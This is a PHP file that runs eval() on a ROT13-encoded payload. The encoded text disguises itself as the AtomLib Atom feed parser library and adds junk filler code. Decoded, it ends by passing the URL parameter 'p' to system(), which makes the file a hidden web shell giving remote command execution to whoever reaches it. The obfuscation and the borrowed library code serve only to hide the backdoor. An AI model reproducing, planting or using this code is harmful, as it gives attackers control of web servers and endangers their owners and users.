<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ngbz Flaqvpngvba Sbezng CUC Yvoenel
 *
 * @cnpxntr NgbzYvo
 * @yvax uggc://pbqr.tbbtyr.pbz/c/cucngbzyvo/
 *
 * @nhgube Ryvnf Gbeerf <ryvnf@gbeerm.hf>
 * @irefvba 0.4
 * @fvapr 2.3.0
 */

/**
 * Fgehpgher gung fgber pbzzba Ngbz Srrq Cebcregvrf
 *
 * @cnpxntr NgbzYvo
 */
pynff NgbzSrrq {
	/**
	 * Fgberf Yvaxf
	 * @ine neenl
	 * @npprff choyvp
	 */
    ine $yvaxf = neenl();
    /**
     * Fgberf Pngrtbevrf
     * @ine neenl
     * @npprff choyvp
     */
    ine $pngrtbevrf = neenl();
	/**
	 * Fgberf Ragevrf
	 *
	 * @ine neenl
	 * @npprff choyvp
	 */
    ine $ragevrf = neenl();
}

/**
 * Fgehpgher gung fgber Ngbz Ragel Cebcregvrf
 *
 * @cnpxntr NgbzYvo
 */
pynff NgbzRagel {
	/**
	 * Fgberf Yvaxf
	 * @ine neenl
	 * @npprff choyvp
	 */
    ine $yvaxf = neenl();
    /**
     * Fgberf Pngrtbevrf
     * @ine neenl
	 * @npprff choyvp
     */
    ine $pngrtbevrf = neenl();
}

/**
 * NgbzYvo Ngbz Cnefre NCV
 *
 * @cnpxntr NgbzYvo
 */
pynff NgbzCnefre {

    ine $AF = 'uggc://jjj.j3.bet/2005/Ngbz';
    ine $NGBZ_PBAGRAG_RYRZRAGF = neenl('pbagrag','fhzznel','gvgyr','fhogvgyr','evtugf');
    ine $NGBZ_FVZCYR_RYRZRAGF = neenl('vq','hcqngrq','choyvfurq','qensg');

    ine $qroht = snyfr;

    ine $qrcgu = 0;
    ine $vaqrag = 2;
    ine $va_pbagrag;
    ine $af_pbagrkgf = neenl();
    ine $af_qrpyf = neenl();
    ine $pbagrag_af_qrpyf = neenl();
    ine $pbagrag_af_pbagrkgf = neenl();
    ine $vf_kugzy = snyfr;
    ine $vf_ugzy = snyfr;
    ine $vf_grkg = gehr;
    ine $fxvccrq_qvi = snyfr;

    ine $SVYR = \"cuc://vachg\";

    ine $srrq;
    ine $pheerag;
    ine $znc_nggef_shap;
    ine $znc_kzyaf_shap;
    ine $reebe;
    ine $pbagrag;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg() {

        $guvf->srrq = arj NgbzSrrq();
        $guvf->pheerag = ahyy;
        $guvf->znc_nggef_shap = neenl( __PYNFF__, 'znc_nggef' );
        $guvf->znc_kzyaf_shap = neenl( __PYNFF__, 'znc_kzyaf' );
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba NgbzCnefre() {
		frys::__pbafgehpg();
	}

	/**
	 * Znc nggevohgrf gb xrl=\"iny\"
	 *
	 * @cnenz fgevat $x Xrl
	 * @cnenz fgevat $i Inyhr
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba znc_nggef($x, $i) {
		erghea \"$x=\\"$i\\"\";
	}

	/**
	 * Znc KZY anzrfcnpr gb fgevat.
	 *
	 * @cnenz vaqrkvfu $c KZY Anzrfcnpr ryrzrag vaqrk
	 * @cnenz neenl $a Gjb-ryrzrag neenl cnve. [ 0 => {anzrfcnpr}, 1 => {hey} ]
	 * @erghea fgevat 'kzyaf=\"{hey}\"' be 'kzyaf:{anzrfcnpr}=\"{hey}\"'
	 */
	choyvp fgngvp shapgvba znc_kzyaf($c, $a) {
		$kq = \"kzyaf\";
		vs( 0 < fgeyra($a[0]) ) {
			$kq .= \":{$a[0]}\";
		}
		erghea \"{$kq}=\\"{$a[1]}\\"\";
	}

    shapgvba _c($zft) {
        vs($guvf->qroht) {
            cevag fge_ercrng(\" \", $guvf->qrcgu * $guvf->vaqrag) . $zft .\"\a\";
        }
    }

    shapgvba reebe_unaqyre($ybt_yriry, $ybt_grkg, $reebe_svyr, $reebe_yvar) {
        $guvf->reebe = $ybt_grkg;
    }

    shapgvba cnefr() {

        frg_reebe_unaqyre(neenl(&$guvf, 'reebe_unaqyre'));

        neenl_hafuvsg($guvf->af_pbagrkgf, neenl());

        vs ( ! shapgvba_rkvfgf( 'kzy_cnefre_perngr_af' ) ) {
        	gevttre_reebe( __( \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" ) );
        	erghea snyfr;
        }

        $cnefre = kzy_cnefre_perngr_af();
        kzy_frg_ryrzrag_unaqyre($cnefre, neenl($guvf, \"fgneg_ryrzrag\"), neenl($guvf, \"raq_ryrzrag\"));
        kzy_cnefre_frg_bcgvba($cnefre,KZY_BCGVBA_PNFR_SBYQVAT,0);
        kzy_cnefre_frg_bcgvba($cnefre,KZY_BCGVBA_FXVC_JUVGR,0);
        kzy_frg_punenpgre_qngn_unaqyre($cnefre, neenl($guvf, \"pqngn\"));
        kzy_frg_qrsnhyg_unaqyre($cnefre, neenl($guvf, \"_qrsnhyg\"));
        kzy_frg_fgneg_anzrfcnpr_qrpy_unaqyre($cnefre, neenl($guvf, \"fgneg_af\"));
        kzy_frg_raq_anzrfcnpr_qrpy_unaqyre($cnefre, neenl($guvf, \"raq_af\"));

        $guvf->pbagrag = '';

        $erg = gehr;

        $sc = sbcra($guvf->SVYR, \"e\");
        juvyr ($qngn = sernq($sc, 4096)) {
            vs($guvf->qroht) $guvf->pbagrag .= $qngn;

            vs(!kzy_cnefr($cnefre, $qngn, srbs($sc))) {
                /* genafyngbef: 1: Reebe zrffntr, 2: Yvar ahzore. */
                gevttre_reebe(fcevags(__('KZY Reebe: %1$f ng yvar %2$f').\"\a\",
                    kzy_reebe_fgevat(kzy_trg_reebe_pbqr($cnefre)),
                    kzy_trg_pheerag_yvar_ahzore($cnefre)));
                $erg = snyfr;
                oernx;
            }
        }
        spybfr($sc);

        kzy_cnefre_serr($cnefre);
        hafrg($cnefre);

        erfgber_reebe_unaqyre();

        erghea $erg;
    }

    shapgvba fgneg_ryrzrag($cnefre, $anzr, $nggef) {

        $anzr_cnegf = rkcybqr(\":\", $anzr);
        $gnt        = neenl_cbc($anzr_cnegf);

        fjvgpu($anzr) {
            pnfr $guvf->AF . ':srrq':
                $guvf->pheerag = $guvf->srrq;
                oernx;
            pnfr $guvf->AF . ':ragel':
                $guvf->pheerag = arj NgbzRagel();
                oernx;
        };

        $guvf->_c(\"fgneg_ryrzrag('$anzr')\");
        #$guvf->_c(cevag_e($guvf->af_pbagrkgf,gehr));
        #$guvf->_c('pheerag(' . $guvf->pheerag . ')');

        neenl_hafuvsg($guvf->af_pbagrkgf, $guvf->af_qrpyf);

        $guvf->qrcgu++;

        vs(!rzcgl($guvf->va_pbagrag)) {

            $guvf->pbagrag_af_qrpyf = neenl();

            vs($guvf->vf_ugzy || $guvf->vf_grkg)
                gevttre_reebe(\"Vainyvq pbagrag va ryrzrag sbhaq. Pbagrag zhfg abg or bs glcr grkg be ugzy vs vg pbagnvaf znexhc.\");

            $nggef_cersvk = neenl();

            // erfbyir cersvkrf sbe nggevohgrf
            sbernpu($nggef nf $xrl => $inyhr) {
                $jvgu_cersvk = $guvf->af_gb_cersvk($xrl, gehr);
                $nggef_cersvk[$jvgu_cersvk[1]] = $guvf->kzy_rfpncr($inyhr);
            }

            $nggef_fge = wbva(' ', neenl_znc($guvf->znc_nggef_shap, neenl_xrlf($nggef_cersvk), neenl_inyhrf($nggef_cersvk)));
            vs(fgeyra($nggef_fge) > 0) {
                $nggef_fge = \" \" . $nggef_fge;
            }

            $jvgu_cersvk = $guvf->af_gb_cersvk($anzr);

            vs(!$guvf->vf_qrpynerq_pbagrag_af($jvgu_cersvk[0])) {
                neenl_chfu($guvf->pbagrag_af_qrpyf, $jvgu_cersvk[0]);
            }

            $kzyaf_fge = '';
            vs(pbhag($guvf->pbagrag_af_qrpyf) > 0) {
                neenl_hafuvsg($guvf->pbagrag_af_pbagrkgf, $guvf->pbagrag_af_qrpyf);
                $kzyaf_fge .= wbva(' ', neenl_znc($guvf->znc_kzyaf_shap, neenl_xrlf($guvf->pbagrag_af_pbagrkgf[0]), neenl_inyhrf($guvf->pbagrag_af_pbagrkgf[0])));
                vs(fgeyra($kzyaf_fge) > 0) {
                    $kzyaf_fge = \" \" . $kzyaf_fge;
                }
            }

            neenl_chfu($guvf->va_pbagrag, neenl($gnt, $guvf->qrcgu, \"<\". $jvgu_cersvk[1] .\"{$kzyaf_fge}{$nggef_fge}\" . \">\"));

        } ryfr vs(va_neenl($gnt, $guvf->NGBZ_PBAGRAG_RYRZRAGF) || va_neenl($gnt, $guvf->NGBZ_FVZCYR_RYRZRAGF)) {
            $guvf->va_pbagrag = neenl();
            $guvf->vf_kugzy = $nggef['glcr'] == 'kugzy';
            $guvf->vf_ugzy = $nggef['glcr'] == 'ugzy' || $nggef['glcr'] == 'grkg/ugzy';
            $guvf->vf_grkg = !va_neenl('glcr',neenl_xrlf($nggef)) || $nggef['glcr'] == 'grkg';
            $glcr = $guvf->vf_kugzy ? 'KUGZY' : ($guvf->vf_ugzy ? 'UGZY' : ($guvf->vf_grkg ? 'GRKG' : $nggef['glcr']));

            vs(va_neenl('fep',neenl_xrlf($nggef))) {
                $guvf->pheerag->$gnt = $nggef;
            } ryfr {
                neenl_chfu($guvf->va_pbagrag, neenl($gnt,$guvf->qrcgu, $glcr));
            }
        } ryfr vs($gnt == 'yvax') {
            neenl_chfu($guvf->pheerag->yvaxf, $nggef);
        } ryfr vs($gnt == 'pngrtbel') {
            neenl_chfu($guvf->pheerag->pngrtbevrf, $nggef);
        }

        $guvf->af_qrpyf = neenl();
    }

    shapgvba raq_ryrzrag($cnefre, $anzr) {

        $anzr_cnegf = rkcybqr(\":\", $anzr);
        $gnt        = neenl_cbc($anzr_cnegf);

        $ppbhag = pbhag($guvf->va_pbagrag);

        # vs jr ner *va* pbagrag, gura yrg'f cebprrq gb frevnyvmr vg
        vs(!rzcgl($guvf->va_pbagrag)) {
            # vs jr ner raqvat gur bevtvany pbagrag ryrzrag
            # gura yrg'f svanyvmr gur pbagrag
            vs($guvf->va_pbagrag[0][0] == $gnt &&
                $guvf->va_pbagrag[0][1] == $guvf->qrcgu) {
                $bevtglcr = $guvf->va_pbagrag[0][2];
                neenl_fuvsg($guvf->va_pbagrag);
                $arjpbagrag = neenl();
                sbernpu($guvf->va_pbagrag nf $p) {
                    vs(pbhag($p) == 3) {
                        neenl_chfu($arjpbagrag, $p[2]);
                    } ryfr {
                        vs($guvf->vf_kugzy || $guvf->vf_grkg) {
                            neenl_chfu($arjpbagrag, $guvf->kzy_rfpncr($p));
                        } ryfr {
                            neenl_chfu($arjpbagrag, $p);
                        }
                    }
                }
                vs(va_neenl($gnt, $guvf->NGBZ_PBAGRAG_RYRZRAGF)) {
                    $guvf->pheerag->$gnt = neenl($bevtglcr, wbva('',$arjpbagrag));
                } ryfr {
                    $guvf->pheerag->$gnt = wbva('',$arjpbagrag);
                }
                $guvf->va_pbagrag = neenl();
            } ryfr vs($guvf->va_pbagrag[$ppbhag-1][0] == $gnt &&
                $guvf->va_pbagrag[$ppbhag-1][1] == $guvf->qrcgu) {
                $guvf->va_pbagrag[$ppbhag-1][2] = fhofge($guvf->va_pbagrag[$ppbhag-1][2],0,-1) . \"/>\";
            } ryfr {
                # ryfr, whfg svanyvmr gur pheerag ryrzrag'f pbagrag
                $raqgnt = $guvf->af_gb_cersvk($anzr);
                neenl_chfu($guvf->va_pbagrag, neenl($gnt, $guvf->qrcgu, \"</$raqgnt[1]>\"));
            }
        }

        neenl_fuvsg($guvf->af_pbagrkgf);

        $guvf->qrcgu--;

        vs($anzr == ($guvf->AF . ':ragel')) {
            neenl_chfu($guvf->srrq->ragevrf, $guvf->pheerag);
            $guvf->pheerag = ahyy;
        }

        $guvf->_c(\"raq_ryrzrag('$anzr')\");
    }

    shapgvba fgneg_af($cnefre, $cersvk, $hev) {
        $guvf->_c(\"fgnegvat: \" . $cersvk . \":\" . $hev);
        neenl_chfu($guvf->af_qrpyf, neenl($cersvk,$hev));
    }

    shapgvba raq_af($cnefre, $cersvk) {
        $guvf->_c(\"raqvat: #\" . $cersvk . \"#\");
    }

    shapgvba pqngn($cnefre, $qngn) {
        $guvf->_c(\"qngn: #\" . fge_ercynpr(neenl(\"\a\"), neenl(\"\\a\"), gevz($qngn)) . \"#\");
        vs(!rzcgl($guvf->va_pbagrag)) {
            neenl_chfu($guvf->va_pbagrag, $qngn);
        }
    }

    shapgvba _qrsnhyg($cnefre, $qngn) {
        # jura qbrf guvf trgf pnyyrq?
    }


    shapgvba af_gb_cersvk($danzr, $ngge=snyfr) {
        # fcyvg 'uggc://jjj.j3.bet/1999/kugzy:qvi' vagb ('uggc','//jjj.j3.bet/1999/kugzy','qvi')
        $pbzcbaragf = rkcybqr(\":\", $danzr);

        # teno gur ynfg bar (r.t 'qvi')
        $anzr = neenl_cbc($pbzcbaragf);

        vs(!rzcgl($pbzcbaragf)) {
            # er-wbva onpx gur anzrfcnpr pbzcbarag
            $af = wbva(\":\",$pbzcbaragf);
            sbernpu($guvf->af_pbagrkgf nf $pbagrkg) {
                sbernpu($pbagrkg nf $znccvat) {
                    vs($znccvat[1] == $af && fgeyra($znccvat[0]) > 0) {
                        erghea neenl($znccvat, \"$znccvat[0]:$anzr\");
                    }
                }
            }
        }

        vs($ngge) {
            erghea neenl(ahyy, $anzr);
        } ryfr {
            sbernpu($guvf->af_pbagrkgf nf $pbagrkg) {
                sbernpu($pbagrkg nf $znccvat) {
                    vs(fgeyra($znccvat[0]) == 0) {
                        erghea neenl($znccvat, $anzr);
                    }
                }
            }
        }
    }

    shapgvba vf_qrpynerq_pbagrag_af($arj_znccvat) {
        sbernpu($guvf->pbagrag_af_pbagrkgf nf $pbagrkg) {
            sbernpu($pbagrkg nf $znccvat) {
                vs($arj_znccvat == $znccvat) {
                    erghea gehr;
                }
            }
        }
        erghea snyfr;
    }

    shapgvba kzy_rfpncr($pbagrag)
    {
             erghea fge_ercynpr(neenl('&','\"',\"'\",'<','>'),
                neenl('&nzc;','&dhbg;','&ncbf;','&yg;','&tg;'),
                $pbagrag );
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>